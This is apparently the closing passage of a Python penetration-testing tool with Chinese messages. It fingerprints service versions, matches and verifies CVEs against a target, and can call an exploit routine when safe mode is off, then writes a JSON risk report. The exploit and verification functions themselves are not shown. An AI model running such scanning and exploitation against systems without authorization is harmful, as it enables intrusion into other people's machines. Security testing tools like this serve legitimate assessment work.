        version = extract_version(full_banner, product)

        version_str = f"{product}/{version}" if version else product
        print(f"  [+] {port}/{service} - {version_str}", file=sys.stderr)

        services.append(
            {
                "port": port,
                "service": service,
                "product": product,
                "version": version,
                "banner": full_banner[:200] if full_banner else "",
                "cves": [],
            }
        )

    # 3. CVE匹配和验证
    print("\n[*] 阶段3: CVE匹配和漏洞验证", file=sys.stderr)
    total_vulns = 0
    all_cves = []

    for svc in services:
        matched_cves = match_cves(svc["service"], svc["product"], svc["version"])
        print(
            f"  [*] {svc['port']}/{svc['service']} - 匹配到 {len(matched_cves)} 个CVE",
            file=sys.stderr,
        )

        for cve in matched_cves:
            # 验证CVE
            verified = verify_cve(args.target, svc["port"], cve, timeout=args.timeout)
            exploited = False

            if verified:
                print(
                    f"  [+] {cve['id']} - 验证通过 ({cve['severity']})", file=sys.stderr
                )
                total_vulns += 1
                all_cves.append(cve)

                # 如果不安全模式且完整模式，尝试利用
                if not safe_mode and args.full:
                    exploited = exploit_cve(args.target, svc["port"], cve, timeout=args.timeout)

            svc["cves"].append(
                {
                    "id": cve["id"],
                    "severity": cve["severity"],
                    "cvss": cve["cvss"],
                    "description": cve["description"],
                    "verified": verified,
                    "exploited": exploited,
                }
            )

    # 4. 风险评估
    risk_level = determine_risk_level(all_cves)

    result = {
        "target": args.target,
        "ports_scanned": len(COMMON_PORTS) if not args.port else 1,
        "open_ports": open_ports,
        "services": services,
        "total_vulns": total_vulns,
        "risk_level": risk_level,
        "report_file": args.output or "",
    }

    output_json = json.dumps(result, ensure_ascii=False, indent=2)

    # 保存报告
    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(output_json)
            print(f"\n[*] 报告已保存到: {args.output}", file=sys.stderr)
        except IOError as e:
            print(f"\n[!] 保存报告失败: {e}", file=sys.stderr)

    # 输出到stdout
    print(output_json)

    # 摘要
    print(f"\n{'=' * 60}", file=sys.stderr)
    print("渗透测试完成!", file=sys.stderr)
    print(f"目标: {args.target}", file=sys.stderr)
    print(f"开放端口: {len(open_ports)}", file=sys.stderr)
    print(f"发现漏洞: {total_vulns}", file=sys.stderr)
    print(f"风险等级: {risk_level}", file=sys.stderr)
    if all_cves:
        print("\n漏洞列表:", file=sys.stderr)
        for cve in all_cves:
            print(f"  - {cve['id']} [{cve['severity']}] {cve['description']}", file=sys.stderr)
    print("=" * 60, file=sys.stderr)


if __name__ == "__main__":
    main()
